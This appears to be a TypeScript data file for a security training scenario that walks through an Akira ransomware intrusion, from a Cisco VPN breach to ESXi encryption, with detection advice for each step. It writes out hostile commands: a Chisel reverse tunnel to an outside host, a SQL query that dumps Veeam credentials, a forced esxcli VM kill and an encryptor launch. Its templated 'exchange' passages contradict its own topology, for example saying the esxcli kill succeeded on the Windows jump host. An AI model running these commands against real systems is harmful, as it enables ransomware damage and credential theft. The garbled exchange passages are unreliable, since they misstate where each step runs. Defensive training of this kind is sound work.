import type { RawScenarioStepGuideData } from '@/modules/scenarios/contracts';

export const stepGuide: RawScenarioStepGuideData = {
    scenarioId: 'akira-ransomware-cisco-anyconnect-esxi',
    briefing: {
      headline:
        'Akira ransomware affiliates breach Cisco ASA/FTD AnyConnect VPN appliances (CVE-2023-20269 / CVE-2020-3259), tunnel via Chisel, dump Veeam backup credentials, run esxcli vm process kill on VMware ESXi hypervisors, and deploy the Rust Akira ESXi encryptor (AA24-109A).',
      storyAnalogy:
        'Imagine a heist crew slips through an old side gate (DefaultWEBVPNGroup) on the perimeter wall that forgot to ask for a second ID factor, digs an underground tunnel (Chisel), steals the master key ring from the backup vault (Veeam SQL DB), walks straight into the power plant running all the virtual offices (VMware ESXi), flips the main breaker on every running virtual office (esxcli vm process kill), and padlocks their hard drives.',
      plainSummary:
        'In this scenario (T1133, Akira Ransomware Cisco ASA VPN Breach & ESXi Hypervisor Encryption (AA24-109A)), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: cisco ASA / AnyConnect Single-Factor VPN, then chisel SOCKS Tunneling, Veeam Credential, then esxcli vm process kill. Steps #1–#3 walk that chain end-to-end by covering Cisco ASA / AnyConnect Single-Factor VPN, then Chisel SOCKS Tunneling, Veeam Credential, then esxcli vm process kill, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.',
      diagramTopologySummary:
        'Akira Affiliate Operator -> Cisco ASA / AnyConnect VPN Appliance -> Windows Jump Host (Chisel & Mimikatz) -> VMware ESXi Host (esxcli + Rust Akira) -> CISA AA24-109A / Sophos MDR Sensor.',
      documentedAdvisory:
        'CISA / FBI / Europol Joint Advisory AA24-109A (#StopRansomware: Akira) / Cisco CVE-2023-20269 / Sophos X-Ops Akira Report',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1133',
        plainTitle: 'Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259)',
        storyAnalogy:
          'Even if the main employee VPN entrance requires a smartphone push code, the firewall still has a hidden default entrance (DefaultWEBVPNGroup) that accepts a password alone.',
        simpleExplanation:
          'Akira affiliates targeted WAN-facing Cisco ASA and Firepower Threat Defense (FTD) appliances, exploiting CVE-2020-3259 (an unauthenticated memory disclosure vulnerability that leaks active session tokens and credentials from ASA memory) or CVE-2023-20269 (an authorization bypass allowing brute-force and password-spray authentication against the built-in DefaultWEBVPNGroup connection profile without triggering MFA), establishing an encrypted AnyConnect VPN session.',
        howItWorksInPractice:
          'Many administrators configured Duo/Azure MFA on their custom VPN tunnel group (Corp-MFA-Tunnel) but left the built-in DefaultWEBVPNGroup or DefaultRAGroup active with local/LDAP password-only authentication. In the documented Firewall exchange from Akira Affiliate Operator to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK T1133 (confirming that the Stage 1: Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259) request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi).',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Akira Affiliate Operator to the Cisco ASA / AnyConnect VPN Appliance over TCP/UDP 443.',
        detectionAndEvidence:
          'Monitor Cisco ASA syslog events %ASA-6-722022 and %ASA-6-113004 (which log AnyConnect IP assignment and group authentication) for logins hitting DefaultWEBVPNGroup or DefaultRAGroup from external hosting ASNs without MFA (detecting initial Akira perimeter entry). Correlate Sysmon or Windows Security Event telemetry for T1133 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1555',
        plainTitle: 'Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi',
        storyAnalogy:
          'Landing on a Windows server, the attacker sets up a hidden proxy pipe and raids the backup server’s database, which conveniently holds the root password to the VMware hypervisors.',
        simpleExplanation:
          'Pivoting to an internal Windows server, the operator launched chisel.exe client https://<c2>:8443 R:socks (establishing a fast TCP-over-HTTP/WebSocket reverse SOCKS5 tunnel) and queried the local VeeamBackup Microsoft SQL database (SELECT user_name, password FROM [VeeamBackup].[dbo].[Credentials], decrypting the DPAPI-protected blobs to recover the cleartext root SSH credentials and vCenter service accounts used by Veeam to snapshot VMware ESXi hosts).',
        howItWorksInPractice:
          'Because backup servers require high-privilege access to every hypervisor and domain controller to perform backups, compromising the Veeam database gives the attacker immediate Tier-0 hypervisor credentials. In the documented EventID 1 exchange from Perimeter Firewall & NDR Tap to Cisco ASA / AnyConnect VPN Appliance, Cisco ASA / AnyConnect VPN Appliance responds with ACK 1 (confirming that the C:\ProgramData\chisel.exe client https://185.220.101.42:8443 R:socks request succeeded on Cisco ASA / AnyConnect VPN Appliance and establishing the runtime state required for Step #3 Stage 3: esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption).',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the Cisco ASA VPN to the Windows Jump Host (Chisel & Mimikatz) and triggers the CISA AA24-109A / Sophos MDR Sensor.',
        detectionAndEvidence:
          'Sysmon EventID 1 for chisel.exe or sqlcmd.exe querying [VeeamBackup].[dbo].[Credentials] and DPAPI CryptUnprotectData calls on the Veeam server.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1489',
        plainTitle: 'esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption',
        storyAnalogy:
          'Instead of breaking into 100 individual virtual servers, the attacker logs into the single physical host running all 100 of them, yanks their power cords (esxcli vm process kill), and encrypts their virtual hard drive files.',
        simpleExplanation:
          'Using the stolen ESXi credentials over SSH, the operator executed a shell loop invoking esxcli vm process list and esxcli vm process kill --type=force --world-id=<id> (forcefully terminating every running vmx virtual machine hypervisor process so the ESXi kernel releases its exclusive file locks on .vmdk and .vswp virtual disk files) and launched the Rust-compiled Akira ELF encryptor (/tmp/akira_esxi -p /vmfs/volumes --fork, encrypting all datastore volumes with ChaCha20/RSA-4096).',
        howItWorksInPractice:
          'Because most enterprises do not install EDR agents directly inside the proprietary VMware ESXi VMkernel OS, encrypting from the hypervisor shell bypasses all guest-OS Windows/Linux EDR agents installed inside the VMs. In the documented EventID 1 exchange from Cisco ASA / AnyConnect VPN Appliance to Windows Jump Host (Chisel & Mimikatz), Windows Jump Host (Chisel & Mimikatz) responds with ALERT 1 (confirming that the esxcli vm process kill --type=force --world-id=2104892 request succeeded on Windows Jump Host (Chisel & Mimikatz) and completing the final execution objective of Akira Ransomware Cisco ASA VPN Breach & ESXi Hypervisor Encryption (AA24-109A)).',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the SSH pivot from the Windows Jump Host to the VMware ESXi Host (esxcli + Rust Akira).',
        detectionAndEvidence:
          'Forward ESXi /var/log/shell.log and /var/log/hostd.log off-host to a central SIEM (preserving hypervisor audit records before local wipe) and alert immediately on esxcli vm process kill bursts paired with unsigned ELF binaries executing from /tmp. Correlate Sysmon or Windows Security Event telemetry for T1489 (pairing parent/child process and destination fields) and contain the offending session.',
      },
    ],
  };
